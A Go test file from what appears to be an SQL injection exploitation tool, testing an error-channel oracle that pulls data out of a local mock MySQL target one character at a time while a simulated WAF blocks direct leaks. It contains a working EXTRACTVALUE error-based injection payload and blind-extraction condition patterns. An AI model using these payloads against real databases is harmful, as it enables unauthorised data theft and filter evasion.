package enumeration

// Tests for the error-channel oracle designed to unblock extraction on
// error-based MySQL targets: evalError leaks an unambiguous "1" / "0" through
// CASE WHEN ((cond)) THEN 1 ELSE 0 END wrapped in the error channel.
//
// The hermetic mock below *only* echoes values that are calibration sentinels
// or CASE-WHEN conditions; any direct substring read (what errorString does)
// is answered with a plain 200 page, simulating a WAF that blocks raw data
// shaped leaks but not one-character oracle answers. Extraction must therefore
// fall back to the blind engine driving reads condition-by-condition through
// evalError.

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/0xseif-code/vexor/internal/httpclient"
	"github.com/0xseif-code/vexor/internal/sqli"
	"github.com/0xseif-code/vexor/internal/sqli/dbms"
	"github.com/0xseif-code/vexor/internal/sqli/injection"
	"github.com/0xseif-code/vexor/internal/sqli/techniques"
)

var (
	reCaseCond = regexp.MustCompile(`(?is)^case when \(\((.*)\)\) then 1 else 0 end$`)
	reLenGe    = regexp.MustCompile(`(?is)^length\(\((.*)\)\)\s*>=?\s*(\d+)$`)
	reAsciiCmp = regexp.MustCompile(`(?is)^ascii\(substring\(\((.*)\),(\d+),1\)\)\s*(<=|>=|=)\s*(\d+)$`)
)

// mockKnown returns the value the simulated backend holds for the test
// expression (mirrors a DB that contains the string 'VEXOR').
func mockKnown(expr string) (string, bool) {
	switch strings.TrimSpace(expr) {
	case "'VEXORTEST'", "('VEXORTEST')":
		return "VEXORTEST", true
	case "SELECT 'VEXOR'", "'VEXOR'":
		return "VEXOR", true
	}
	return "", false
}

// mockEvalCond resolves a condition expression against the mock value.
func mockEvalCond(cond string) (bool, bool) {
	if m := reCaseCond.FindStringSubmatch(cond); m != nil {
		return mockEvalCond(m[1])
	}
	if m := reLenGe.FindStringSubmatch(cond); m != nil {
		v, ok := mockKnown(m[1])
		if !ok {
			return false, false
		}
		n, _ := strconv.Atoi(m[2])
		return len(v) >= n, true
	}
	if m := reAsciiCmp.FindStringSubmatch(cond); m != nil {
		v, ok := mockKnown(m[1])
		if !ok {
			return false, false
		}
		pos, _ := strconv.Atoi(m[2])
		if pos < 1 || pos > len(v) {
			return false, true
		}
		code := int(v[pos-1])
		want, _ := strconv.Atoi(m[4])
		switch m[3] {
		case "<=":
			return code <= want, true
		case ">=":
			return code >= want, true
		default:
			return code == want, true
		}
	}
	return false, false
}

// extractInjected pulls the value expression out of an injected error-channel
// payload (both the ~...~ and ~~...~~ delimiter families).
func extractInjected(v string) (string, bool) {
	up := strings.ToUpper(v)
	var start, end string
	if strings.Contains(up, "0X7E7E,(") {
		start, end = "0x7e7e,(", "),0x7e7e"
	} else if strings.Contains(up, "0X7E,(") {
		start, end = "0x7e,(", "),0x7e)"
	} else {
		return "", false
	}
	i := strings.Index(v, start)
	if i < 0 {
		return "", false
	}
	i += len(start)
	rest := v[i:]
	j := strings.Index(rest, end)
	if j < 0 {
		return "", false
	}
	return rest[:j], true
}

// newErrorOracleMock serves only calibration sentinels and CASE-WHEN
// conditions through the error channel; everything else gets a plain 200.
func newErrorOracleMock() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		inner, ok := extractInjected(r.URL.Query().Get("id"))
		if !ok {
			w.WriteHeader(200)
			fmt.Fprintln(w, "<html><body>normal page</body></html>")
			return
		}
		if strings.HasPrefix(strings.ToLower(inner), "case when") {
			res, _ := mockEvalCond(inner)
			if res {
				atomic.AddInt32(&mockEvalProbes, 1)
				w.WriteHeader(500)
				fmt.Fprint(w, "XPATH syntax error: '~1~'")
				return
			}
			atomic.AddInt32(&mockEvalProbes, 1)
			w.WriteHeader(500)
			fmt.Fprint(w, "XPATH syntax error: '~0~'")
			return
		}
		if val, ok := mockKnown(inner); ok {
			w.WriteHeader(500)
			fmt.Fprintf(w, "XPATH syntax error: '~%s~'", val)
			return
		}
		// Direct data-shaped leak: blocked by the mock WAF.
		w.WriteHeader(200)
		fmt.Fprintln(w, "<html><body>normal page</body></html>")
	})
}

var mockEvalProbes int32

func newErrorExtractor(t *testing.T, srvURL string) *Extractor {
	t.Helper()
	client := httpclient.NewClient(httpclient.ClientOptions{})
	points, err := injection.Enumerate(injection.RequestSource{
		Method: "GET",
		URL:    srvURL + "/?id=1",
	}, injection.Options{Level: 1})
	if err != nil {
		t.Fatalf("enumerate point: %v", err)
	}
	det := sqli.Detection{
		Technique: techniques.TechError,
		DBMS:      dbms.MySQL,
		Point:     *points[0],
		Payload:   "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -",
	}
	return NewExtractor(det, client, Options{Concurrency: 1, Progress: io.Discard})
}

// TestEvalErrorOracle verifies the CASE-WHEN oracle decides cleanly both ways.
func TestEvalErrorOracle(t *testing.T) {
	srv := httptest.NewServer(newErrorOracleMock())
	defer srv.Close()
	ext := newErrorExtractor(t, srv.URL)
	ctx := context.Background()

	ok, err := ext.probe(ctx, "length((SELECT 'VEXOR')) >= 5")
	if err != nil {
		t.Fatalf("probe(len>=5): %v", err)
	}
	if !ok {
		t.Fatal("probe(len>=5) = false, want true (VEXOR has length 5)")
	}
	ok, err = ext.probe(ctx, "length((SELECT 'VEXOR')) >= 9")
	if err != nil {
		t.Fatalf("probe(len>=9): %v", err)
	}
	if ok {
		t.Fatal("probe(len>=9) = true, want false")
	}
	ok, err = ext.probe(ctx, "ascii(substring((SELECT 'VEXOR'),1,1)) = 86")
	if err != nil || !ok {
		t.Fatalf("probe(ascii 'V' = 86) = %v, %v", ok, err)
	}
	ok, err = ext.probe(ctx, "ascii(substring((SELECT 'VEXOR'),1,1)) = 65")
	if err != nil || ok {
		t.Fatalf("probe(ascii 'V' = 65) = %v, %v; want false", ok, err)
	}
}

// TestErrorExtractionFallsBackToEvalError drives a full ExtractString while the
// mock refuses direct substring leaks, proving the blind engine reads through
// the error oracle.
func TestErrorExtractionFallsBackToEvalError(t *testing.T) {
	atomic.StoreInt32(&mockEvalProbes, 0)
	srv := httptest.NewServer(newErrorOracleMock())
	defer srv.Close()
	ext := newErrorExtractor(t, srv.URL)

	got, err := ext.ExtractString(context.Background(), "SELECT 'VEXOR'")
	if err != nil {
		t.Fatalf("ExtractString: %v", err)
	}
	if got != "VEXOR" {
		t.Fatalf("ExtractString = %q, want %q", got, "VEXOR")
	}
	if n := atomic.LoadInt32(&mockEvalProbes); n == 0 {
		t.Fatal("evalError oracle was never consulted; the direct error channel must have leaked data against the mock")
	}
}